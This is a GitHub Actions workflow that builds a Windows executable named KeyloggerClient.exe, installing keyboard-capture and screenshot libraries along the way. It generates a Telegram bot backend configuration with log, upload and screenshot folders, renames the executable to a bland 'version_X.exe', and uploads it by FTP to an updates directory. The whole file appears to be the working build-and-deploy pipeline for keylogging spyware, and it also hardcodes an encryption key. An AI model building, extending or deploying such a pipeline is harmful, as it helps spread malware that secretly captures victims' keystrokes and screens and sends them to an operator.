name: Build and Deploy Telegram PHP Backend + Windows EXE

on:
  push:
    branches:
      - main

jobs:
  deploy:
    runs-on: windows-latest
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v3
    
    - name: Setup Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'
        cache: 'pip'
    
    - name: Install Python dependencies
      run: |
        python -m pip install --upgrade pip setuptools wheel
        pip install -r requirements.txt
        pip install pyinstaller
        pip install cryptography pynput pywin32 pillow pyautogui psutil requests python-dotenv packaging
    
    - name: Verify installations
      run: |
        python -c "import keyboard; print('keyboard OK')"
        python -c "import pyautogui; print('pyautogui OK')"
        python -c "import cryptography; print('cryptography OK')"
        python -c "import psutil; print('psutil OK')"
        python -c "import PIL; print('PIL OK')"
        pyinstaller --version
    
    - name: Build Windows EXE from Python
      env:
        CI: true
      run: |
        python build.py
    
    - name: Verify build output
      shell: bash
      run: |
        if [ ! -f "dist/KeyloggerClient.exe" ]; then
          echo "ERROR: Build failed - KeyloggerClient.exe not found!"
          exit 1
        fi
        FILE_SIZE=$(stat -c%s "dist/KeyloggerClient.exe" 2>/dev/null || stat -f%z "dist/KeyloggerClient.exe")
        FILE_SIZE_MB=$(echo "scale=2; $FILE_SIZE / 1048576" | bc)
        echo "Build successful! File size: ${FILE_SIZE_MB} MB"
        if (( $(echo "$FILE_SIZE_MB < 5" | bc -l) )); then
          echo "WARNING: File size is suspiciously small (${FILE_SIZE_MB} MB). Expected ~80 MB."
          echo "Checking build artifacts..."
          ls -lh dist/
        fi
    
    - name: Rename built EXE by version
      shell: bash
      run: |
        VERSION="${{ secrets.CLIENT_VERSION }}"
        RENAMED="version_${VERSION//./_}.exe"
        mv dist/KeyloggerClient.exe dist/$RENAMED
        echo "RENAMED_FILE=$RENAMED" >> $GITHUB_ENV
        echo "Renamed to: $RENAMED"
        ls -lh dist/$RENAMED
    
    - name: Generate .env file from secrets
      shell: bash
      run: |
        mkdir -p telegram/log telegram/uploads telegram/screenshots
        cat > telegram/.env << EOF
        BASE_URL=${{ secrets.BASE_URL }}
        SERVER_URL=${{ secrets.BASE_URL }}/api.php
        BOT_TOKEN=${{ secrets.BOT_TOKEN }}
        WEBHOOK_SECRET=${{ secrets.WEBHOOK_SECRET }}
        ADMIN_CHAT_ID=${{ secrets.ADMIN_CHAT_ID }}
        DB_HOST=${{ secrets.DB_HOST }}
        DB_NAME=${{ secrets.DB_NAME }}
        DB_USER=${{ secrets.DB_USER }}
        DB_PASS=${{ secrets.DB_PASS }}
        SECRET_TOKEN=1
        ENCRYPTION_KEY=nTds2GHvEWeOGJibjZuaf8kY5T5YWyfMx4J3B1NA0Jo=
        CLIENT_VERSION=${{ secrets.CLIENT_VERSION }}
        EOF
        echo ".env file created successfully"
    
    - name: Check if commit includes [upload]
      id: check_upload
      shell: bash
      run: |
        if git log -1 --pretty=%B | grep -iq "\[upload\]"; then
          echo "upload=true" >> $GITHUB_OUTPUT
          echo "Upload flag detected in commit message"
        else
          echo "upload=false" >> $GITHUB_OUTPUT
          echo "No upload flag in commit message"
        fi
    
    - name: Upload Telegram PHP to FTP
      if: steps.check_upload.outputs.upload == 'true'
      uses: SamKirkland/FTP-Deploy-Action@4.0.0
      with:
        server: ${{ secrets.FTP_HOST }}
        username: ${{ secrets.FTP_USERNAME }}
        password: ${{ secrets.FTP_PASSWORD }}
        local-dir: telegram/
        server-dir: ${{ secrets.FTP_PATH }}/
        exclude: |
          **/.git*
          **/.github*
          **/node_modules/*
          **/*.md
          **/tests/*
    
    - name: Create updates directory on FTP
      if: steps.check_upload.outputs.upload == 'true'
      shell: bash
      run: |
        echo "Creating updates directory..."
        curl --ftp-create-dirs \
          --user "${{ secrets.FTP_USERNAME }}:${{ secrets.FTP_PASSWORD }}" \
          "ftp://${{ secrets.FTP_HOST }}${{ secrets.FTP_PATH }}/updates/" \
          -Q "MKD updates" || echo "Directory might already exist"
    
    - name: Upload built EXE to FTP /updates/
      if: steps.check_upload.outputs.upload == 'true'
      shell: bash
      run: |
        echo "Uploading $RENAMED_FILE to FTP..."
        FILE_SIZE=$(stat -c%s "dist/$RENAMED_FILE" 2>/dev/null || stat -f%z "dist/$RENAMED_FILE")
        FILE_SIZE_MB=$(echo "scale=2; $FILE_SIZE / 1048576" | bc)
        echo "File size: ${FILE_SIZE_MB} MB"
        
        curl -T "dist/$RENAMED_FILE" \
          --user "${{ secrets.FTP_USERNAME }}:${{ secrets.FTP_PASSWORD }}" \
          --ftp-create-dirs \
          --progress-bar \
          "ftp://${{ secrets.FTP_HOST }}${{ secrets.FTP_PATH }}/updates/$RENAMED_FILE"
        
        echo "Upload completed!"
    
    - name: Verify FTP upload
      if: steps.check_upload.outputs.upload == 'true'
      shell: bash
      run: |
        echo "Verifying uploaded file..."
        curl --head \
          --user "${{ secrets.FTP_USERNAME }}:${{ secrets.FTP_PASSWORD }}" \
          "ftp://${{ secrets.FTP_HOST }}${{ secrets.FTP_PATH }}/updates/$RENAMED_FILE" \
          && echo "File verified on FTP!" \
          || echo "WARNING: Could not verify file on FTP"
    
    - name: Upload artifacts
      if: always()
      uses: actions/upload-artifact@v4
      with:
        name: build-artifacts
        path: |
          dist/
          build/
        retention-days: 7